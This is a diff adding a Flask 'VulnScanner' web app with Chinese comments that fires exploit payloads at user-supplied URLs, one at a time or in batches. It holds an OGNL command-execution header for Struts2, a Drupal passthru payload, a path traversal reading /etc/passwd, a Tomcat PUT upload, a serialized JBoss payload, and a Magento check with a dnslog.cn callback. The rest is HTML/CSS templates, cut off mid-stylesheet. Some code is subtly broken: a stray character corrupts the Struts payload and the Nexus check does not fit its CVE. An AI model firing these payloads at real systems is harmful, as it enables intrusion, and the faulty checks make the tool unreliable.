@@ -1,0 +1,2158 @@
+import os
+import re
+import time
+import requests
+import urllib3
+from flask import Flask, render_template, request, redirect, url_for, flash
+from urllib.parse import urljoin
+from datetime import datetime
+
+# 禁用 SSL 警告
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+app = Flask(__name__)
+app.secret_key = 'supersecretkey'
+
+
+# 添加上下文处理器
+@app.context_processor
+def inject_now():
+    return {'now': datetime.now()}
+
+
+# 漏洞检测函数 (保持不变)
+def check_magento_xxe(url):
+    """检测 Adobe Magento XXE 漏洞 (CVE-2024-34102)"""
+    url = url.rstrip("/")
+    target_url = urljoin(url, "/rest/V1/guest-carts/1/estimate-shipping-methods")
+
+    try:
+        headers = {
+            "User-Agent": "Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
+            "Content-Type": "application/json"
+        }
+
+        # 获取 DNSLog 域名
+        getdomain = requests.get(
+            'http://dnslog.cn/getdomain.php',
+            headers={"Cookie": "PHPSESSID=hb0p9iqh804esb5khaulm8ptp2"},
+            timeout=30
+        )
+        domain = str(getdomain.text)
+
+        # 构造恶意请求
+        data = """{"address":{"totalsCollector":{"collectorList":{"totalCollector":{"sourceData":{"data":"http://%s","dataIsURL":true,"options":12345678}}}}}}""" % domain
+        requests.post(target_url, data=data, headers=headers, verify=False, timeout=25)
+
+        # 检查 DNS 记录
+        for _ in range(3):
+            time.sleep(1)
+            refresh = requests.get(
+                'http://dnslog.cn/getrecords.php',
+                headers={"Cookie": "PHPSESSID=hb0p9iqh804esb5khaulm8ptp2"},
+                timeout=30
+            )
+            if domain in refresh.text:
+                return True, "AdobeMagento_CVE-2024-34102_XXE"
+
+        return False, "未检测到漏洞"
+
+    except Exception as e:
+        return False, f"检测失败: {str(e)}"
+
+
+def check_adobe_coldfusion(url):
+    """检测 Adobe ColdFusion 任意文件读取漏洞 (CVE-2024-20767)"""
+    url = url.rstrip("/")
+    target = urljoin(url, "/CFIDE/administrator/enter.cfm")
+
+    try:
+        headers = {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
+        }
+
+        # 构造恶意请求读取 /etc/passwd
+        response = requests.get(
+            target + "?file=../../../../etc/passwd",
+            headers=headers,
+            verify=False,
+            timeout=15
+        )
+
+        if response.status_code == 200 and 'root:' in response.text:
+            return True, "AdobeColdFusion_CVE-2024-20767_ArbitraryFileRead"
+        else:
+            return False, "未检测到漏洞"
+
+    except Exception as e:
+        return False, f"检测失败: {str(e)}"
+
+
+def check_struts2_rce(url):
+    """检测 Struts2 远程代码执行漏洞 (CVE-2017-5638)"""
+    url = url.rstrip("/")
+
+    try:
+        headers = {
+            "Content-Type": "%{(#nike='multipart/form-data')."
+                            "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
+                            "(#_memberAccess?(#_memberAccess=#dm):"
+                            "((#container=#context['极.opensymphony.xwork2.ActionContext.container'])."
+                            "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
+                            "(#ognlUtil.getExcludedPackageNames().clear())."
+                            "(#ognlUtil.getExcludedClasses().clear())."
+                            "(#context.setMemberAccess(#dm))))."
+                            "(#cmd='echo VulnScanner_Struts2_RCE')."
+                            "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
+                            "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
+                            "(#p=new java.lang.ProcessBuilder(#cmds))."
+                            "(#p.redirectErrorStream(true))."
+                            "(#process=#p.start())."
+                            "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
+                            "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
+                            "(#ros.flush())}"
+        }
+
+        response = requests.get(url, headers=headers, verify=False, timeout=15)
+
+        if "VulnScanner_Struts2_RCE" in response.text:
+            return True, "Struts2_CVE-2017-5638_RCE"
+        else:
+            return False, "未检测到漏洞"
+
+    except Exception as e:
+        return False, f"检测失败: {str(e)}"
+
+
+def check_tomcat_file_upload(url):
+    """检测 Tomcat 任意文件上传漏洞 (CVE-2017-12615)"""
+    url = url.rstrip("/")
+    test_url = url + "/vulnscanner_test.txt"
+
+    try:
+        # 尝试 PUT 方法上传文件
+        response = requests.put(
+            test_url,
+            data="VulnScanner Test File",
+            verify=False,
+            timeout=15
+        )
+
+        if response.status_code in [201, 204]:
+            # 验证文件是否上传成功
+            get_response = requests.get(test_url, verify=False, timeout=15)
+            if get_response.status_code == 200 and "VulnScanner Test File" in get_response.text:
+                # 清理测试文件
+                try:
+                    requests.delete(test_url, verify=False, timeout=5)
+                except:
+                    pass
+                return True, "Tomcat_CVE-2017-12615_FileUpload"
+            # 清理测试文件
+            try:
+                requests.delete(test_url, verify=False, timeout=5)
+            except:
+                pass
+
+        return False, "未检测到漏洞"
+
+    except Exception as e:
+        return False, f"检测失败: {str(e)}"
+
+
+def check_jboss_deserialization(url):
+    """检测 JBoss 反序列化漏洞 (CVE-2017-12149)"""
+    url = url.rstrip("/")
+    target_url = urljoin(url, "/invoker/readonly")
+
+    try:
+        payload = (
+            "aced0005737d00000001001a6a6176612e726d692e72656769737472792e5265676973747279"
+            "787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb020001"
+            "4c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e4861"
+            "6e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a65"
+            "6374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176"
+            "612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e0300007870"
+            "77040000000000000000740012456e61626c6564436865636b65644f757478"
+        )
+
+        response = requests.post(
+            target_url,
+            data=bytes.fromhex(payload),
+            headers={"Content-Type": "application/json"},
+            verify=False,
+            timeout=15
+        )
+
+        if response.status_code == 500 and "Deserialization" in response.text:
+            return True, "JBoss_CVE-2017-12149_Deserialization"
+        else:
+            return False, "未检测到漏洞"
+
+    except Exception as e:
+        return False, f"检测失败: {str(e)}"
+
+
+def check_drupal_rce(url):
+    """检测 Drupal 远程代码执行漏洞 (CVE-2018-7600)"""
+    url = url.rstrip("/")
+    target_url = urljoin(url,
+                         "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax")
+
+    try:
+        payload = {
+            "form_id": "user_register_form",
+            "_drupal_ajax": "1",
+            "mail[#post_render][]": "passthru",
+            "mail[#type]": "markup",
+            "mail[#markup]": "echo VulnScanner_Drupal_RCE"
+        }
+
+        response = requests.post(
+            target_url,
+            data=payload,
+            verify=False,
+            timeout=15
+        )
+
+        if "VulnScanner_Drupal_RCE" in response.text:
+            return True, "Drupal_CVE-2018-7600_RCE"
+        else:
+            return False, "未检测到漏洞"
+
+    except Exception as e:
+        return False, f"检测失败: {str(e)}"
+
+
+def check_nexus_rce(url):
+    """检测 Nexus Repository Manager 远程代码执行漏洞 (CVE-2019-7238)"""
+    url = url.rstrip("/")
+    target_url = urljoin(url, "/service/rest/beta/repositories/go/group")
+
+    try:
+        payload = {
+            "name": "internal",
+            "blobStoreName": "default",
+            "strictContentTypeValidation": True,
+            "groupWriteMember": "ext://../etc/passwd"
+        }
+
+        response = requests.post(
+            target_url,
+            json=payload,
+            verify=False,
+            timeout=15
+        )
+
+        if response.status_code == 400 and "ext://../etc/passwd" in response.text:
+            return True, "Nexus_CVE-2019-7238_RCE"
+        else:
+            return False, "未检测到漏洞"
+
+    except Exception as e:
+        return False, f"检测失败: {str(e)}"
+
+
+# 扫描函数
+def scan_target(url, scan_type):
+    """扫描目标URL"""
+    results = []
+
+    # 检测所有漏洞类型
+    if scan_type == "all":
+        checks = [
+            ("Adobe Magento XXE", check_magento_xxe),
+            ("Adobe ColdFusion 任意文件读取", check_adobe_coldfusion),
+            ("Struts2 远程代码执行", check_struts2_rce),
+            ("Tomcat 任意文件上传", check_tomcat_file_upload),
+            ("JBoss 反序列化", check_jboss_deserialization),
+            ("Drupal 远程代码执行", check_drupal_rce),
+            ("Nexus 远程代码执行", check_nexus_rce)
+        ]
+    else:
+        # 根据选择的扫描类型执行特定检测
+        scan_map = {
+            "xxe": [("Adobe Magento XXE", check_magento_xxe)],
+            "rce": [
+                ("Struts2 远程代码执行", check_struts2_rce),
+                ("Drupal 远程代码执行", check_drupal_rce),
+                ("Nexus 远程代码执行", check_nexus_rce)
+            ],
+            "file": [
+                ("Adobe ColdFusion 任意文件读取", check_adobe_coldfusion),
+                ("Tomcat 任意文件上传", check_tomcat_file_upload)
+            ],
+            "deserialization": [("JBoss 反序列化", check_jboss_deserialization)]
+        }
+        checks = scan_map.get(scan_type, [])
+
+    # 执行检测
+    for name, func in checks:
+        start_time = time.time()
+        try:
+            vulnerable, message = func(url)
+        except Exception as e:
+            vulnerable = False
+            message = f"检测过程中出错: {str(e)}"
+        elapsed = time.time() - start_time
+
+        results.append({
+            "name": name,
+            "vulnerable": vulnerable,
+            "message": message,
+            "time": f"{elapsed:.2f}秒"
+        })
+
+    return results
+
+
+# Flask 路由
+@app.route('/')
+def index():
+    """首页"""
+    return render_template('index.html')
+
+
+@app.route('/scan', methods=['POST'])
+def scan():
+    """执行扫描"""
+    url = request.form.get('url')
+    scan_type = request.form.get('scan_type', 'all')
+
+    if not url:
+        flash('请输入目标URL', 'danger')
+        return redirect(url_for('index'))
+
+    try:
+        results = scan_target(url, scan_type)
+        return render_template('results.html', url=url, scan_type=scan_type, results=results)
+    except Exception as e:
+        flash(f'扫描过程中发生错误: {str(e)}', 'danger')
+        return redirect(url_for('index'))
+
+
+@app.route('/batch_scan', methods=['POST'])
+def batch_scan():
+    """批量扫描"""
+    if 'file' not in request.files:
+        flash('未选择文件', 'danger')
+        return redirect(url_for('index'))
+
+    file = request.files['file']
+    scan_type = request.form.get('batch_scan_type', 'all')
+
+    if file.filename == '':
+        flash('未选择文件', 'danger')
+        return redirect(url_for('index'))
+
+    try:
+        # 读取文件内容
+        content = file.read().decode('utf-8')
+        urls = [line.strip() for line in content.splitlines() if line.strip()]
+
+        # 限制扫描数量
+        max_urls = 20
+        if len(urls) > max_urls:
+            urls = urls[:max_urls]
+            flash(f'为了性能考虑，只扫描前{max_urls}个URL', 'warning')
+
+        # 执行批量扫描
+        results = []
+        for url in urls:
+            try:
+                scan_results = scan_target(url, scan_type)
+                vulnerabilities_count = sum(1 for r in scan_results if r['vulnerable'])
+                results.append({
+                    "url": url,
+                    "vulnerabilities_count": vulnerabilities_count,
+                    "details": scan_results
+                })
+            except Exception as e:
+                results.append({
+                    "url": url,
+                    "error": str(e)
+                })
+
+        return render_template('batch_results.html', results=results, scan_type=scan_type)
+
+    except Exception as e:
+        flash(f'文件处理错误: {str(e)}', 'danger')
+        return redirect(url_for('index'))
+
+
+@app.route('/vulnerabilities')
+def vulnerabilities():
+    """漏洞库页面"""
+    vuln_db = [
+        {
+            "id": "CVE-2024-34102",
+            "name": "Adobe Magento XXE",
+            "description": "Adobe Commerce 和 Magento Open Source 中的漏洞，攻击者可以利用此漏洞读取服务器上的任意文件。",
+            "severity": "高危",
+            "affected_versions": "Magento Open Source < 2.4.7, Adobe Commerce < 2.4.7",
+            "solution": "升级到最新版本或应用安全补丁"
+        },
+        {
+            "id": "CVE-2024-20767",
+            "name": "Adobe ColdFusion 任意文件读取",
+            "description": "Adobe ColdFusion 中的漏洞，攻击者可以读取服务器上的敏感文件。",
+            "severity": "高危",
+            "affected_versions": "ColdFusion 2023 < Update 1, ColdFusion 2021 < Update 9",
+            "solution": "升级到最新版本或应用安全补丁"
+        },
+        {
+            "id": "CVE-2017-5638",
+            "name": "Apache Struts2 远程代码执行",
+            "description": "Apache Struts2 的 Jakarta Multipart 解析器存在漏洞，攻击者可在上传文件时通过修改 HTTP 请求头中的 Content-Type 值触发该漏洞，导致远程代码执行。",
+            "severity": "严重",
+            "affected_versions": "Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10",
+            "solution": "升级到 Struts 2.3.32 或 2.5.10.1 及以上版本"
+        },
+        {
+            "id": "CVE-2017-12615",
+            "name": "Tomcat 任意文件上传",
+            "description": "当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 方法时，攻击者可通过构造的请求上传任意文件，甚至上传 JSP 文件并在服务器上执行任意代码。",
+            "severity": "高危",
+            "affected_versions": "Apache Tomcat 7.0.0 - 7.0.79",
+            "solution": "升级到 7.0.81 及以上版本，或禁用 PUT 方法"
+        },
+        {
+            "id": "CVE-2017-12149",
+            "name": "JBoss 反序列化",
+            "description": "JBoss AS 5.x/6.x 的反序列化漏洞，攻击者可以访问服务器 JMX Invoker 接口的 readonly 方法，传入精心构造的序列化数据，从而在目标服务器上执行任意代码。",
+            "severity": "严重",
+            "affected_versions": "JBoss AS 5.x, 6.x",
+            "solution": "升级到最新版本或删除 jmx-invoker-service.xml 文件"
+        },
+        {
+            "id": "CVE-2018-7600",
+            "name": "Drupal 远程代码执行",
+            "description": "Drupal 中的漏洞，攻击者可以在未授权的情况下执行任意代码。",
+            "severity": "严重",
+            "affected_versions": "Drupal 7.x, 8.x",
+            "solution": "升级到最新版本或应用安全补丁"
+        },
+        {
+            "id": "CVE-2019-7238",
+            "name": "Nexus Repository Manager 远程代码执行",
+            "description": "Nexus Repository Manager 中的漏洞，攻击者可以在未授权的情况下执行任意代码。",
+            "severity": "高危",
+            "affected_versions": "Nexus Repository Manager 3.x < 3.15.0",
+            "solution": "升级到最新版本或应用安全补丁"
+        }
+    ]
+
+    return render_template('vulnerabilities.html', vuln_db=vuln_db)
+
+
+# 添加 404 错误处理器
+@app.errorhandler(404)
+def page_not_found(e):
+    return render_template('404.html'), 404
+
+
+# 创建 templates 目录并添加基本模板
+def ensure_template_directory():
+    """确保模板目录存在并创建基本模板文件"""
+    templates_dir = os.path.join(os.path.dirname(__file__), 'templates')
+    os.makedirs(templates_dir, exist_ok=True)
+
+    # 创建 index.html
+    index_path = os.path.join(templates_dir, 'index.html')
+    with open(index_path, 'w', encoding='utf-8') as f:
+        f.write("""<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>漏洞扫描系统 - VulnScanner</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <style>
+        :root {
+            --primary: #1a1a2e;
+            --secondary: #16213e;
+            --accent: #e94560;
+            --warning: #ff9a3c;
+            --success: #0f9d58;
+            --info: #4285f4;
+            --text-light: #f0f0f0;
+            --text-dark: #333;
+            --card-bg: rgba(255, 255, 255, 0.08);
+            --transition: all 0.3s ease;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            color: var(--text-light);
+            min-height: 100vh;
+            background-attachment: fixed;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        header {
+            background: rgba(10, 10, 20, 0.85);
+            backdrop-filter: blur(10px);
+            padding: 15px 0;
+            border-bottom: 1px solid rgba(233, 69, 96, 0.3);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 700;
+            font-size: 1.8rem;
+            color: var(--text-light);
+            text-decoration: none;
+        }
+
+        .logo-icon {
+            color: var(--accent);
+            font-size: 2rem;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 25px;
+        }
+
+        .nav-link {
+            color: var(--text-light);
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 1.1rem;
+            transition: var(--transition);
+            padding: 8px 15px;
+            border-radius: 4px;
+        }
+
+        .nav-link:hover, .nav-link.active {
+            background: rgba(233, 69, 96, 0.2);
+            color: var(--accent);
+        }
+
+        .hero {
+            padding: 80px 0 50px;
+            text-align: center;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .hero h1 {
+            font-size: 3.2rem;
+            margin-bottom: 20px;
+            font-weight: 700;
+            background: linear-gradient(45deg, var(--accent), var(--warning));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            font-family: 'Orbitron', sans-serif;
+        }
+
+        .hero p {
+            font-size: 1.3rem;
+            opacity: 0.85;
+            margin-bottom: 40px;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 12px;
+            padding: 30px;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: var(--transition);
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
+            border-color: rgba(233, 69, 96, 0.4);
+        }
+
+        .card-title {
+            font-size: 1.6rem;
+            margin-bottom: 20px;
+            color: var(--accent);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        input, select, textarea {
+            width: 100%;
+            padding: 14px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 6px;
+            color: var(--text-light);
+            font-size: 1rem;
+            transition: var(--transition);
+        }
+
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: var(--accent);
+            background: rgba(0, 0, 0, 0.4);
+        }
+
+        .btn {
+            display: inline-block;
+            background: var(--accent);
+            color: white;
+            border: none;
+            padding: 14px 30px;
+            font-size: 1.1rem;
+            font-weight: 500;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: var(--transition);
+            text-align: center;
+        }
+
+        .btn:hover {
+            background: #ff2e4f;
+            transform: translateY(-3px);
+            box-shadow: 0 7px 15px rgba(233, 69, 96, 0.3);
+        }
+
+        .btn-block {
+            display: block;
+            width: 100%;
+        }
+
+        .btn-secondary {
+            background: var(--info);
+        }
+
+        .btn-secondary:hover {
+            background: #2b6de9;
+        }
+
+        .flex-container {
+            display: flex;
+            gap: 30px;
+            margin-bottom: 40px;
+        }
+
+        .flex-container .card {
+            flex: 1;
+        }
+
+        .result-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 25px;
+            margin-top: 20px;
+        }
+
+        .vuln-card {
+            background: rgba(0, 0, 0, 0.25);
+            border-radius: 10px;
+            padding: 20px;
+            transition: var(--transition);
+            border-left: 4px solid var(--accent);
+        }
+
+        .vuln-card.safe {
+            border-left-color: var(--success);
+        }
+
+        .vuln-card.vulnerable {
+            border-left-color: var(--accent);
+            background: rgba(233, 69, 96, 0.1);
+        }
+
+        .vuln-card h3 {
+            font-size: 1.2rem;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .status-badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-weight: 500;
+        }
+
+        .status-vulnerable {
+            background: var(--accent);
+        }
+
+        .status-safe {
+            background: var(--success);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 25px 0;
+        }
+
+        th, td {
+            padding: 15px;
+            text-align: left;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        th {
+            background: rgba(0, 0, 0, 0.3);
+            font-weight: 500;
+            color: var(--accent);
+        }
+
+        tr:hover {
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .chart-container {
+            height: 300px;
+            margin: 30px 0;
+        }
+
+        footer {
+            text-align: center;
+            padding: 40px 0;
+            margin-top: 60px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .alert {
+            padding: 15px;
+            border-radius: 6px;
+            margin: 20px 0;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .alert-danger {
+            background: rgba(233, 69, 96, 0.2);
+            border: 1px solid var(--accent);
+        }
+
+        .alert-warning {
+            background: rgba(255, 154, 60, 0.2);
+            border: 1px solid var(--warning);
+        }
+
+        .alert-success {
+            background: rgba(15, 157, 88, 0.2);
+            border: 1px solid var(--success);
+        }
+
+        .severity-badge {
+            display: inline-block;
+            padding: 3px 10px;
+            border-radius: 4px;
+            font-size: 0.85rem;
+            font-weight: 500;
+        }
+
+        .severity-high {
+            background: var(--accent);
+        }
+
+        .severity-critical {
+            background: #d32f2f;
+        }
+
+        .severity-medium {
+            background: var(--warning);
+        }
+
+        /* Responsive styles */
+        @media (max-width: 768px) {
+            .flex-container {
+                flex-direction: column;
+            }
+
+            .hero h1 {
+                font-size: 2.5rem;
+            }
+
+            .nav-links {
+                display: none;
+            }
+
+            .result-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="navbar">
+                <a href="/" class="logo">
+                    <span class="logo-icon">🔒</span>
+                    <span>VulnScanner</span>
+                </a>
+                <div class="nav-links">
+                    <a href="/" class="nav-link active">首页</a>
+                    <a href="/vulnerabilities" class="nav-link">漏洞库</a>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main class="container">
+        <!-- 首页/扫描页面 -->
+  <section id="home-page">
+    <div class="hero">
+        <h1>安全漏洞扫描系统</h1>
+        <p>全面检测您的Web应用程序安全漏洞，提供专业的安全评估报告</p>
+    </div>
+
+    <!-- 修改开始：分离两个表单 -->
+    <div class="flex-container">
+        <!-- 单目标扫描卡片 -->
+        <div class="card">
+            <form action="/scan" method="post">
+                <h2 class="card-title">单目标扫描</h2>
+                <div class="form-group">
+                    <label for="url">目标URL</label>
+                    <input type="url" id="url" name="url" placeholder="https://example.com" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="scan_type">扫描类型</label>
+                    <select id="scan_type" name="scan_type">
+                        <option value="all">全部扫描</option>
+                        <option value="xxe">XXE漏洞</option>
+                        <option value="rce">远程代码执行</option>
+                        <option value="file">文件操作漏洞</option>
+                        <option value="deserialization">反序列化漏洞</option>
+                    </select>
+                </div>
+
+                <button type="submit" class="btn btn-block">开始扫描</button>
+            </form>
+        </div>
+
+            <!-- 批量扫描卡片 -->
+        <div class="card">
+            <form action="/batch_scan" method="post" enctype="multipart/form-data">
+                <h2 class="card-title">批量扫描</h2>
+                <div class="form-group">
+                    <label for="file">上传URL列表文件</label>
+                    <input type="file" id="file" name="file" accept=".txt" required>
+                    <p style="margin-top: 10px; font-size: 0.9rem; opacity: 0.7;">每行一个URL，支持最多20个目标</p>
+                </div>
+
+                <div class="form-group">
+                    <label for="batch_scan_type">扫描类型</label>
+                    <select id="batch_scan_type" name="batch_scan_type">
+                        <option value="all">全部扫描</option>
+                        <option value="xxe">XXE漏洞</option>
+                        <option value="rce">远程代码执行</option>
+                        <option value="file">文件操作漏洞</option>
+                        <option value="deserialization">反序列化漏洞</option>
+                    </select>
+                </div>
+
+                <button type="submit" class="btn btn-block btn-secondary">批量扫描</button>
+            </form>
+        </div>
+    </div>
+            </form>
+
+            <div class="card">
+                <h2 class="card-title">漏洞统计概览</h2>
+
+                <div class="result-grid">
+                    <div class="vuln-card vulnerable">
+                        <h3>
+                            <span>Adobe Magento XXE</span>
+                            <span class="status-badge status-vulnerable">存在漏洞</span>
+                        </h3>
+                        <p><strong>CVE:</strong> CVE-2024-34102</p>
+                        <p><strong>详情:</strong> 检测到XXE漏洞，可能导致敏感信息泄露</p>
+                    </div>
+
+                    <div class="vuln-card safe">
+                        <h3>
+                            <span>Struts2 RCE</span>
+                            <span class="status-badge status-safe">安全</span>
+                        </h3>
+                        <p><strong>CVE:</strong> CVE-2017-5638</p>
+                        <p><strong>详情:</strong> 未检测到远程代码执行漏洞</p>
+                    </div>
+
+                    <div class="vuln-card vulnerable">
+                        <h3>
+                            <span>Tomcat 文件上传</span>
+                            <span class="status-badge status-vulnerable">存在漏洞</span>
+                        </h3>
+                        <p><strong>CVE:</strong> CVE-2017-12615</p>
+                        <p><strong>详情:</strong> 检测到任意文件上传漏洞</p>
+                    </div>
+
+                    <div class="vuln-card safe">
+                        <h3>
+                            <span>JBoss 反序列化</span>
+                            <span class="status-badge status-safe">安全</span>
+                        </h3>
+                        <p><strong>CVE:</strong> CVE-2017-12149</p>
+                        <p><strong>详情:</strong> 未检测到反序列化漏洞</p>
+                    </div>
+                </div>
+
+                <div class="chart-container">
+                    <canvas id="vulnChart"></canvas>
+                </div>
+            </div>
+</section>
+    </main>
+
+    <footer>
+        <div class="container">
+            <p>漏洞扫描系统 &copy; {{ now.strftime('%Y') }} - 安全防护专家</p>
+            <p>最后扫描时间: {{ now.strftime('%Y-%m-%d %H:%M:%S') }}</p>
+        </div>
+    </footer>
+
+    <script>
+        // 初始化漏洞统计图表
+        const ctx = document.getElementById('vulnChart').getContext('2d');
+        const vulnChart = new Chart(ctx, {
+            type: 'doughnut',
+            data: {
+                labels: ['存在漏洞', '安全', '未扫描'],
+                datasets: [{
+                    data: [12, 28, 10],
+                    backgroundColor: [
+                        'rgba(233, 69, 96, 0.8)',
+                        'rgba(15, 157, 88, 0.8)',
+                        'rgba(66, 133, 244, 0.8)'
+                    ],
+                    borderColor: [
+                        'rgba(233, 69, 96, 1)',
+                        'rgba(15, 157, 88, 1)',
+                        'rgba(66, 133, 244, 1)'
+                    ],
+                    borderWidth: 1
+                }]
+            },
+            options: {
+                responsive: true,
+                maintainAspectRatio: false,
+                plugins: {
+                    legend: {
+                        position: 'bottom',
+                        labels: {
+                            color: '#f0f0f0',
+                            font: {
+                                size: 14
+                            }
+                        }
+                    },
+                    title: {
+                        display: true,
+                        text: '漏洞分布统计',
+                        color: '#f0f0f0',
+                        font: {
+                            size: 18
+                        }
+                    }
+                }
+            }
+        });
+    </script>
+</body>
+</html>""")
+
+    # 创建 results.html
+    results_path = os.path.join(templates_dir, 'results.html')
+    with open(results_path, 'w', encoding='utf-8') as f:
+        f.write("""<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>扫描结果 - VulnScanner</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #1a1a2e;
+            --secondary: #16213e;
+            --accent: #e94560;
+            --warning: #ff9a3c;
+            --success: #0f9d58;
+            --info: #4285f4;
+            --text-light: #f0f0f0;
+            --text-dark: #333;
+            --card-bg: rgba(255, 255, 255, 0.08);
+            --transition: all 0.3s ease;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            color: var(--text-light);
+            min-height: 100vh;
+            background-attachment: fixed;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        header {
+            background: rgba(10, 10, 20, 0.85);
+            backdrop-filter: blur(10px);
+            padding: 15px 0;
+            border-bottom: 1px solid rgba(233, 69, 96, 0.3);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 700;
+            font-size: 1.8rem;
+            color: var(--text-light);
+            text-decoration: none;
+        }
+
+        .logo-icon {
+            color: var(--accent);
+            font-size: 2rem;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 25px;
+        }
+
+        .nav-link {
+            color: var(--text-light);
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 1.1rem;
+            transition: var(--transition);
+            padding: 8px 15px;
+            border-radius: 4px;
+        }
+
+        .nav-link:hover, .nav-link.active {
+            background: rgba(233, 69, 96, 0.2);
+            color: var(--accent);
+        }
+
+        .hero {
+            padding: 50px 0 30px;
+            text-align: center;
+        }
+
+        .hero h1 {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+            font-weight: 700;
+            background: linear-gradient(45deg, var(--accent), var(--warning));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            font-family: 'Orbitron', sans-serif;
+        }
+
+        .hero p {
+            font-size: 1.1rem;
+            opacity: 0.85;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 12px;
+            padding: 30px;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .card-title {
+            font-size: 1.6rem;
+            margin-bottom: 20px;
+            color: var(--accent);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .result-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 25px;
+            margin-top: 20px;
+        }
+
+        .vuln-card {
+            background: rgba(0, 0, 0, 0.25);
+            border-radius: 10px;
+            padding: 20px;
+            border-left: 4px solid var(--accent);
+        }
+
+        .vuln-card.safe {
